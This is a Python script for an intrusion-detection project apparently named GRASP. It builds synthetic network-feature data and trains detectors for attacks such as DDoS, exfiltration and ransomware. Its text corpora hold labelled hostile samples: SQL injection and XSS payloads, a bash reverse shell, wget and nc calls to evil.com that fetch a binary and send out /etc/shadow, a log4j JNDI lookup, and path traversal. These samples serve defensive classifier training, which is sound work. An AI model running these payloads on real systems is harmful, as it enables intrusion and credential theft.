"""
============================================================================
GRASP — Master ML Training Pipeline for All 14 CPU Agents
============================================================================
Generates synthetic attack-vector feature matrices, trains individual
ML models (IsolationForest / RandomForest / TF-IDF pipelines) for each
agent, and persists them to /backend/checkpoints/ as .pkl files.

Usage:
    cd D:\\Cyber_project
    python -m backend.ai_model.train_cpu_ml_agents

Models produced:
    ddos_agent_iforest.pkl        (IsolationForest)
    behavior_agent_iforest.pkl    (IsolationForest)
    spike_agent_iforest.pkl       (IsolationForest)
    exfiltration_agent_rf.pkl     (RandomForest)
    port_scan_agent_rf.pkl        (RandomForest)
    lateral_movement_agent_rf.pkl (RandomForest)
    brute_force_agent_rf.pkl      (RandomForest)
    supply_inject_agent_rf.pkl    (RandomForest)
    priv_escalation_agent_rf.pkl  (RandomForest)
    mitm_agent_rf.pkl             (RandomForest)
    ransomware_agent_rf.pkl       (RandomForest)
    c2_beacon_agent_rf.pkl        (RandomForest)
    sqli_xss_agent_tfidf.pkl      (TF-IDF + LogisticRegression)
    sqli_xss_agent_vectorizer.pkl (TF-IDF Vectorizer)
    signature_agent_tfidf.pkl     (TF-IDF + LogisticRegression)
    signature_agent_vectorizer.pkl(TF-IDF Vectorizer)
============================================================================
"""
import os
import sys
import numpy as np
import joblib
import logging

# Ensure project root is importable
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, f1_score

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger("train_cpu_ml_agents")

CHECKPOINT_DIR = os.path.join("backend", "checkpoints")
os.makedirs(CHECKPOINT_DIR, exist_ok=True)

np.random.seed(42)


# ============================================================================
# SECTION 1 — SYNTHETIC DATA GENERATORS
# ============================================================================

def generate_ddos_features(n_samples=2000):
    """
    DDoS feature space:
    [in_degree, out_degree, bytes_recv, pkt_rate, syn_ratio,
     unique_src_ips, avg_pkt_size, connection_duration]
    """
    # Benign traffic: moderate degrees, normal ratios
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(5, 2, n_benign),      # in_degree
        np.random.normal(4, 2, n_benign),      # out_degree
        np.random.normal(5000, 2000, n_benign), # bytes_recv
        np.random.normal(10, 5, n_benign),      # pkt_rate
        np.random.uniform(0.05, 0.3, n_benign), # syn_ratio
        np.random.normal(3, 1, n_benign),       # unique_src_ips
        np.random.normal(512, 200, n_benign),   # avg_pkt_size
        np.random.normal(30, 10, n_benign),     # connection_duration
    ])

    # DDoS traffic: extremely high inbound, massive pkt_rate, high syn_ratio
    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(200, 80, n_attack),       # in_degree (flood)
        np.random.normal(2, 1, n_attack),           # out_degree (minimal)
        np.random.normal(500000, 100000, n_attack),  # bytes_recv (massive)
        np.random.normal(500, 200, n_attack),        # pkt_rate (extreme)
        np.random.uniform(0.7, 0.99, n_attack),     # syn_ratio (SYN flood)
        np.random.normal(50, 20, n_attack),          # unique_src_ips (spoofed)
        np.random.normal(64, 20, n_attack),          # avg_pkt_size (small SYN)
        np.random.normal(0.5, 0.3, n_attack),       # connection_duration (short)
    ])

    X = np.vstack([benign, attack])
    X = np.clip(X, 0, None)  # No negatives
    return X


def generate_behavior_features(n_samples=2000):
    """
    Behavior feature space:
    [in_degree, out_degree, bytes_out, bytes_in, out_in_ratio]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(5, 2, n_benign),
        np.random.normal(5, 2, n_benign),
        np.random.normal(3000, 1000, n_benign),
        np.random.normal(3000, 1000, n_benign),
        np.random.normal(1.0, 0.3, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(50, 20, n_attack),
        np.random.normal(1, 1, n_attack),
        np.random.normal(100, 50, n_attack),
        np.random.normal(50000, 10000, n_attack),
        np.random.normal(0.01, 0.005, n_attack),
    ])

    X = np.vstack([benign, attack])
    X = np.clip(X, 0, None)
    return X


def generate_spike_features(n_samples=2000):
    """
    Spike feature space:
    [current_degree, rolling_mean, rolling_std, z_score, delta_from_prev]
    """
    n_benign = n_samples // 2
    means = np.random.normal(5, 2, n_benign)
    stds = np.abs(np.random.normal(1, 0.5, n_benign)) + 0.1
    benign = np.column_stack([
        means + np.random.normal(0, 0.5, n_benign),  # current_degree
        means,                                         # rolling_mean
        stds,                                          # rolling_std
        np.random.normal(0, 0.5, n_benign),           # z_score (normal)
        np.random.normal(0, 1, n_benign),              # delta_from_prev
    ])

    n_attack = n_samples - n_benign
    means_a = np.random.normal(5, 2, n_attack)
    stds_a = np.abs(np.random.normal(1, 0.5, n_attack)) + 0.1
    attack = np.column_stack([
        means_a + np.random.normal(15, 5, n_attack),  # current_degree (spiked)
        means_a,
        stds_a,
        np.random.normal(4, 1, n_attack),              # z_score (extreme)
        np.random.normal(12, 5, n_attack),             # delta_from_prev
    ])

    X = np.vstack([benign, attack])
    return X


def generate_exfiltration_features(n_samples=2000):
    """
    Exfiltration feature space:
    [bytes_out, bytes_in, out_in_ratio, unique_dst_ips, avg_payload_size,
     session_duration, out_degree, protocol_diversity]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(3000, 1000, n_benign),
        np.random.normal(5000, 2000, n_benign),
        np.random.uniform(0.3, 1.5, n_benign),
        np.random.normal(3, 1, n_benign),
        np.random.normal(512, 200, n_benign),
        np.random.normal(30, 10, n_benign),
        np.random.normal(4, 2, n_benign),
        np.random.normal(2, 1, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(100000, 30000, n_attack),  # Massive outbound
        np.random.normal(500, 200, n_attack),         # Minimal inbound
        np.random.uniform(10, 200, n_attack),          # Extreme ratio
        np.random.normal(1, 0.5, n_attack),            # Single destination
        np.random.normal(50000, 10000, n_attack),       # Large payloads
        np.random.normal(5, 3, n_attack),               # Short sessions
        np.random.normal(1, 0.5, n_attack),             # Single target
        np.random.normal(1, 0.3, n_attack),             # Single protocol
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_port_scan_features(n_samples=2000):
    """
    Port Scan feature space:
    [unique_targets, unique_ports, scan_rate, syn_only_ratio,
     avg_pkt_size, rst_ratio, total_connections, connection_failures]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(2, 1, n_benign),
        np.random.normal(3, 1, n_benign),
        np.random.normal(1, 0.5, n_benign),
        np.random.uniform(0.05, 0.2, n_benign),
        np.random.normal(512, 200, n_benign),
        np.random.uniform(0.01, 0.1, n_benign),
        np.random.normal(5, 2, n_benign),
        np.random.normal(1, 0.5, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(50, 20, n_attack),       # Many targets
        np.random.normal(200, 100, n_attack),      # Many ports
        np.random.normal(100, 40, n_attack),       # Fast scanning
        np.random.uniform(0.8, 0.99, n_attack),   # SYN-only
        np.random.normal(60, 10, n_attack),        # Tiny packets
        np.random.uniform(0.6, 0.95, n_attack),   # Many RSTs
        np.random.normal(500, 200, n_attack),      # Mass connections
        np.random.normal(400, 150, n_attack),      # Mass failures
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_lateral_movement_features(n_samples=2000):
    """
    Lateral Movement feature space:
    [hop_count, internal_connections, unique_subnets, time_spread,
     auth_events, new_hosts_contacted, protocol_switch_count, priv_level_delta]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(1, 0.5, n_benign),
        np.random.normal(3, 1, n_benign),
        np.random.normal(1, 0.3, n_benign),
        np.random.normal(3600, 1000, n_benign),
        np.random.normal(1, 0.5, n_benign),
        np.random.normal(0, 0.3, n_benign),
        np.random.normal(0, 0.3, n_benign),
        np.random.normal(0, 0.1, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(5, 2, n_attack),         # Multi-hop
        np.random.normal(20, 8, n_attack),         # Many internal connections
        np.random.normal(4, 1, n_attack),           # Cross-subnet
        np.random.normal(300, 100, n_attack),       # Fast traversal
        np.random.normal(10, 5, n_attack),          # Many auth events
        np.random.normal(8, 3, n_attack),           # New hosts
        np.random.normal(3, 1, n_attack),           # Protocol switching
        np.random.normal(2, 1, n_attack),           # Privilege escalation
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_bruteforce_features(n_samples=2000):
    """
    Brute Force feature space:
    [auth_failures, auth_rate, unique_usernames, lockout_count,
     time_between_attempts, password_entropy_avg, geo_distance, success_ratio]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(1, 0.5, n_benign),
        np.random.normal(0.1, 0.05, n_benign),
        np.random.normal(1, 0.3, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(60, 30, n_benign),
        np.random.normal(4, 1, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.uniform(0.8, 1.0, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(50, 20, n_attack),         # Many failures
        np.random.normal(10, 5, n_attack),           # Fast rate
        np.random.normal(5, 2, n_attack),             # Multiple usernames
        np.random.normal(3, 1, n_attack),             # Lockouts triggered
        np.random.normal(0.5, 0.3, n_attack),        # Very fast attempts
        np.random.normal(2, 0.5, n_attack),           # Low entropy passwords
        np.random.normal(5, 2, n_attack),             # Geo anomaly
        np.random.uniform(0.0, 0.1, n_attack),       # Very low success
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_supply_inject_features(n_samples=2000):
    """
    Supply Chain Injection feature space:
    [new_edges_count, node_age_hours, supplier_reputation_score,
     edge_weight_anomaly, cross_tier_connection, cert_validity_days,
     api_call_frequency, payload_hash_novelty]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(0, 0.3, n_benign),
        np.random.normal(720, 300, n_benign),
        np.random.uniform(0.7, 1.0, n_benign),
        np.random.normal(0, 0.1, n_benign),
        np.random.normal(0, 0.1, n_benign),
        np.random.normal(365, 100, n_benign),
        np.random.normal(10, 5, n_benign),
        np.random.normal(0, 0.1, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(5, 2, n_attack),           # New suspicious edges
        np.random.normal(1, 0.5, n_attack),           # Brand new node
        np.random.uniform(0.0, 0.3, n_attack),       # Low reputation
        np.random.normal(3, 1, n_attack),             # Weight anomaly
        np.random.normal(1, 0.3, n_attack),           # Cross-tier violations
        np.random.normal(5, 3, n_attack),             # Nearly expired cert
        np.random.normal(100, 40, n_attack),          # API flood
        np.random.uniform(0.7, 1.0, n_attack),       # Novel payload hash
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_priv_escalation_features(n_samples=2000):
    """
    Privilege Escalation feature space:
    [rbac_violations, out_degree, target_criticality, role_change_count,
     admin_api_calls, sudo_events, new_permissions_granted, time_since_last_role_change]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(0, 0.1, n_benign),
        np.random.normal(4, 2, n_benign),
        np.random.normal(2, 1, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(1, 0.5, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(720, 200, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(5, 2, n_attack),
        np.random.normal(15, 5, n_attack),
        np.random.normal(9, 1, n_attack),
        np.random.normal(3, 1, n_attack),
        np.random.normal(20, 8, n_attack),
        np.random.normal(5, 2, n_attack),
        np.random.normal(4, 2, n_attack),
        np.random.normal(1, 0.5, n_attack),
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_mitm_features(n_samples=2000):
    """
    MITM feature space:
    [path_deviation, direct_edge_exists, betweenness_centrality,
     arp_mismatch_count, cert_chain_length, tls_downgrade_flag,
     duplicate_mac_count, packet_delay_variance]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(0, 0.2, n_benign),
        np.random.uniform(0, 1, n_benign),
        np.random.uniform(0, 0.1, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(3, 1, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(1, 0.5, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(3, 1, n_attack),           # Route deviation
        np.random.uniform(0.7, 1.0, n_attack),      # Bypassing direct edge
        np.random.uniform(0.3, 0.8, n_attack),      # High centrality (interception)
        np.random.normal(5, 2, n_attack),            # ARP mismatches
        np.random.normal(1, 0.5, n_attack),          # Short cert chain
        np.random.uniform(0.5, 1.0, n_attack),      # TLS downgrade
        np.random.normal(3, 1, n_attack),            # Duplicate MACs
        np.random.normal(10, 5, n_attack),           # High delay variance
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_ransomware_features(n_samples=2000):
    """
    Ransomware feature space:
    [file_lock_events, affected_nodes, encryption_rate, unique_extensions,
     ransom_note_detected, lateral_spread_hops, time_window_density, api_crypto_calls]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(0, 0.1, n_benign),
        np.random.normal(0, 0.1, n_benign),
        np.random.normal(0, 0.1, n_benign),
        np.random.normal(5, 2, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(0, 0, n_benign),
        np.random.normal(1, 0.5, n_benign),
        np.random.normal(1, 0.5, n_benign),
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(50, 20, n_attack),         # File locks
        np.random.normal(10, 4, n_attack),           # Affected nodes
        np.random.normal(100, 40, n_attack),         # Encryption rate
        np.random.normal(1, 0.3, n_attack),          # Single extension (.locked)
        np.random.uniform(0.5, 1.0, n_attack),      # Ransom note found
        np.random.normal(4, 2, n_attack),            # Spread hops
        np.random.normal(20, 8, n_attack),           # Dense activity
        np.random.normal(50, 20, n_attack),          # Crypto API calls
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_c2_beacon_features(n_samples=2000):
    """
    C2 Beaconing feature space:
    [interval_mean, interval_std, interval_cv, fft_peak_prominence,
     regularity_score, packet_size_uniformity, dns_query_entropy, jitter_ratio]
    """
    n_benign = n_samples // 2
    benign = np.column_stack([
        np.random.normal(30, 20, n_benign),        # Random intervals
        np.random.normal(15, 10, n_benign),         # High variance
        np.random.uniform(0.3, 1.0, n_benign),     # High CV
        np.random.normal(1, 0.5, n_benign),         # Low FFT peak
        np.random.uniform(0.0, 0.3, n_benign),     # Low regularity
        np.random.uniform(0.1, 0.5, n_benign),     # Variable sizes
        np.random.normal(4, 1, n_benign),           # Normal DNS entropy
        np.random.uniform(0.3, 1.0, n_benign),     # High jitter
    ])

    n_attack = n_samples - n_benign
    attack = np.column_stack([
        np.random.normal(60, 5, n_attack),          # Fixed interval (beacon)
        np.random.normal(2, 1, n_attack),            # Very low variance
        np.random.uniform(0.01, 0.1, n_attack),    # Very low CV
        np.random.normal(8, 2, n_attack),            # Strong FFT peak
        np.random.uniform(0.7, 0.99, n_attack),    # High regularity
        np.random.uniform(0.8, 0.99, n_attack),    # Uniform packet sizes
        np.random.normal(6, 0.5, n_attack),          # DGA-style entropy
        np.random.uniform(0.0, 0.1, n_attack),     # Very low jitter
    ])

    X = np.vstack([benign, attack])
    y = np.array([0] * n_benign + [1] * n_attack)
    X = np.clip(X, 0, None)
    return X, y


def generate_sqli_xss_corpus(n_samples=2000):
    """Generate synthetic text payloads for SQLi/XSS NLP classification."""
    benign_templates = [
        "GET /api/users?page={} HTTP/1.1",
        "POST /api/search query=medical+supplies",
        "GET /dashboard/stats?range=7d",
        "POST /api/order item_id={} qty={}",
        "GET /api/products?category=antibiotics&sort=price",
        "POST /api/auth/login username=admin password=securePass123!",
        "GET /api/inventory?warehouse=main&status=active",
        "PUT /api/patient/{}/records body=vitals_update",
        "GET /api/reports/monthly?format=pdf",
        "POST /api/shipment/track tracking_id={}",
    ]
    attack_templates = [
        "GET /api/users?id=1' OR 1=1 --",
        "POST /login username=admin'-- password=x",
        "GET /search?q=<script>alert('XSS')</script>",
        "GET /api?id=1; DROP TABLE users; --",
        "POST /comment body=<img src=x onerror=alert(document.cookie)>",
        "GET /api?q=' UNION SELECT * FROM passwords --",
        "GET /page?name=<svg onload=alert(1)>",
        "POST /form input='; EXEC xp_cmdshell('whoami'); --",
        "GET /api?filter=<iframe src=javascript:alert(1)>",
        "POST /api?data=' AND 1=1 UNION SELECT NULL,NULL --",
        "GET /search?q=<script>eval(atob('YWxlcnQoMSk='))</script>",
        "POST /upload file='; INSERT INTO admin VALUES('hack','pass'); --",
        "GET /api?id=0x31 OR 0x32=0x32",
        "GET /page?search=javascript:document.cookie",
    ]

    texts, labels = [], []
    for _ in range(n_samples // 2):
        tpl = np.random.choice(benign_templates)
        texts.append(tpl.format(*[np.random.randint(1, 999) for _ in range(tpl.count('{'))]))
        labels.append(0)
    for _ in range(n_samples - n_samples // 2):
        texts.append(np.random.choice(attack_templates))
        labels.append(1)
    return texts, np.array(labels)


def generate_signature_corpus(n_samples=2000):
    """Generate synthetic payloads for signature-based NLP classification."""
    benign_templates = [
        "HTTP/1.1 200 OK Content-Type: application/json",
        "TCP SYN ACK seq=12345 window=65535",
        "DNS QUERY A record for api.hospital-supply.com",
        "TLS 1.3 Handshake ClientHello cipher=AES_256_GCM",
        "ICMP Echo Request id=1234 seq=1",
        "HTTP GET /api/health HTTP/1.1 Host: grasp.local",
        "SMTP EHLO mail.supplier.com",
        "NTP request stratum=2 poll=64",
    ]
    attack_templates = [
        "reverse shell bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
        "trojan beacon callback c2.malware.net:8443",
        "rootkit kernel module injection /dev/kmem write",
        "keylogger capturing keystrokes buffer dump",
        "backdoor bind shell listening on port 31337",
        "exploit CVE-2021-44228 log4j jndi:ldap://evil.com/payload",
        "malware dropper wget http://evil.com/stage2.exe -O /tmp/x",
        "path traversal ../../../etc/passwd",
        "command injection ; cat /etc/shadow | nc evil.com 9999",
        "buffer overflow AAAA...x41x41x41 shellcode NOP sled",
    ]

    texts, labels = [], []
    for _ in range(n_samples // 2):
        texts.append(np.random.choice(benign_templates))
        labels.append(0)
    for _ in range(n_samples - n_samples // 2):
        texts.append(np.random.choice(attack_templates))
        labels.append(1)
    return texts, np.array(labels)


# ============================================================================
# SECTION 2 — MODEL TRAINING FUNCTIONS
# ============================================================================

def train_isolation_forest(X, name, contamination=0.15):
    """Train and save an IsolationForest model for unsupervised anomaly detection."""
    logger.info(f"  Training IsolationForest for [{name}] — {X.shape[0]} samples, {X.shape[1]} features")
    clf = IsolationForest(
        contamination=contamination,
        n_estimators=200,
        max_samples='auto',
        random_state=42,
        n_jobs=-1,
    )
    clf.fit(X)

    # Evaluate: anomaly scores on training data
    scores = clf.decision_function(X)
    preds = clf.predict(X)
    anomaly_pct = (preds == -1).sum() / len(preds) * 100
    logger.info(f"    Anomaly rate: {anomaly_pct:.1f}% | Score range: [{scores.min():.4f}, {scores.max():.4f}]")

    path = os.path.join(CHECKPOINT_DIR, f"{name}_iforest.pkl")
    joblib.dump(clf, path)
    logger.info(f"    Saved: {path} ({os.path.getsize(path):,} bytes)")
    return clf


def train_random_forest(X, y, name, n_estimators=150):
    """Train and save a RandomForest classifier for supervised detection."""
    logger.info(f"  Training RandomForest for [{name}] — {X.shape[0]} samples, {X.shape[1]} features")
    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)

    clf = RandomForestClassifier(
        n_estimators=n_estimators,
        max_depth=12,
        min_samples_leaf=5,
        random_state=42,
        n_jobs=-1,
        class_weight='balanced',
    )
    clf.fit(X_train, y_train)

    # Evaluate
    y_pred = clf.predict(X_test)
    acc = accuracy_score(y_test, y_pred)
    f1 = f1_score(y_test, y_pred)
    logger.info(f"    Accuracy: {acc:.4f} | F1-Score: {f1:.4f}")

    path = os.path.join(CHECKPOINT_DIR, f"{name}_rf.pkl")
    joblib.dump(clf, path)
    logger.info(f"    Saved: {path} ({os.path.getsize(path):,} bytes)")
    return clf


def train_tfidf_classifier(texts, labels, name):
    """Train and save a TF-IDF + LogisticRegression pipeline for NLP-based detection."""
    logger.info(f"  Training TF-IDF + LogisticRegression for [{name}] — {len(texts)} samples")

    X_train, X_test, y_train, y_test = train_test_split(texts, labels, test_size=0.2, random_state=42, stratify=labels)

    # Train TF-IDF Vectorizer separately (agents need it for inference)
    vectorizer = TfidfVectorizer(
        max_features=5000,
        ngram_range=(1, 3),
        analyzer='char_wb',  # Character n-grams (effective for injection detection)
        sublinear_tf=True,
    )
    X_train_tfidf = vectorizer.fit_transform(X_train)
    X_test_tfidf = vectorizer.transform(X_test)

    clf = LogisticRegression(
        C=1.0,
        max_iter=500,
        class_weight='balanced',
        random_state=42,
    )
    clf.fit(X_train_tfidf, y_train)

    # Evaluate
    y_pred = clf.predict(X_test_tfidf)
    acc = accuracy_score(y_test, y_pred)
    f1 = f1_score(y_test, y_pred)
    logger.info(f"    Accuracy: {acc:.4f} | F1-Score: {f1:.4f}")

    vec_path = os.path.join(CHECKPOINT_DIR, f"{name}_vectorizer.pkl")
    clf_path = os.path.join(CHECKPOINT_DIR, f"{name}_tfidf.pkl")
    joblib.dump(vectorizer, vec_path)
    joblib.dump(clf, clf_path)
    logger.info(f"    Saved: {vec_path} ({os.path.getsize(vec_path):,} bytes)")
    logger.info(f"    Saved: {clf_path} ({os.path.getsize(clf_path):,} bytes)")
    return vectorizer, clf


# ============================================================================
# SECTION 3 — MAIN EXECUTION
# ============================================================================

def main():
    print("=" * 70)
    print("  GRASP — Master ML Training Pipeline for 14 CPU Agents")
    print("=" * 70)
    print()

    results = {}

    # ── Group 1: Isolation Forest (Unsupervised) ──
    print("=" * 70)
    print("  GROUP 1: Isolation Forest Agents (Unsupervised Anomaly Detection)")
    print("=" * 70)

    X_ddos = generate_ddos_features(3000)
    results["ddos_agent"] = train_isolation_forest(X_ddos, "ddos_agent")
    print()

    X_behavior = generate_behavior_features(3000)
    results["behavior_agent"] = train_isolation_forest(X_behavior, "behavior_agent")
    print()

    X_spike = generate_spike_features(3000)
    results["spike_agent"] = train_isolation_forest(X_spike, "spike_agent")
    print()

    # ── Group 2: Random Forest (Supervised Classification) ──
    print("=" * 70)
    print("  GROUP 2: Random Forest Agents (Supervised Classification)")
    print("=" * 70)

    X, y = generate_exfiltration_features(3000)
    results["exfiltration_agent"] = train_random_forest(X, y, "exfiltration_agent")
    print()

    X, y = generate_port_scan_features(3000)
    results["port_scan_agent"] = train_random_forest(X, y, "port_scan_agent")
    print()

    X, y = generate_lateral_movement_features(3000)
    results["lateral_movement_agent"] = train_random_forest(X, y, "lateral_movement_agent")
    print()

    X, y = generate_bruteforce_features(3000)
    results["brute_force_agent"] = train_random_forest(X, y, "brute_force_agent")
    print()

    X, y = generate_supply_inject_features(3000)
    results["supply_inject_agent"] = train_random_forest(X, y, "supply_inject_agent")
    print()

    X, y = generate_priv_escalation_features(3000)
    results["priv_escalation_agent"] = train_random_forest(X, y, "priv_escalation_agent")
    print()

    X, y = generate_mitm_features(3000)
    results["mitm_agent"] = train_random_forest(X, y, "mitm_agent")
    print()

    X, y = generate_ransomware_features(3000)
    results["ransomware_agent"] = train_random_forest(X, y, "ransomware_agent")
    print()

    X, y = generate_c2_beacon_features(3000)
    results["c2_beacon_agent"] = train_random_forest(X, y, "c2_beacon_agent")
    print()

    # ── Group 3: TF-IDF NLP Classifiers ──
    print("=" * 70)
    print("  GROUP 3: TF-IDF NLP Agents (Text Payload Classification)")
    print("=" * 70)

    texts, labels = generate_sqli_xss_corpus(3000)
    results["sqli_xss_agent"] = train_tfidf_classifier(texts, labels, "sqli_xss_agent")
    print()

    texts, labels = generate_signature_corpus(3000)
    results["signature_agent"] = train_tfidf_classifier(texts, labels, "signature_agent")
    print()

    # ── Final Summary ──
    print("=" * 70)
    print("  TRAINING COMPLETE — ALL 14 CPU AGENT MODELS")
    print("=" * 70)
    for name in results:
        path_patterns = [
            os.path.join(CHECKPOINT_DIR, f"{name}_iforest.pkl"),
            os.path.join(CHECKPOINT_DIR, f"{name}_rf.pkl"),
            os.path.join(CHECKPOINT_DIR, f"{name}_tfidf.pkl"),
        ]
        for p in path_patterns:
            if os.path.exists(p):
                size = os.path.getsize(p)
                print(f"  [OK] {os.path.basename(p):45s} {size:>10,} bytes")
    print("=" * 70)


if __name__ == "__main__":
    main()
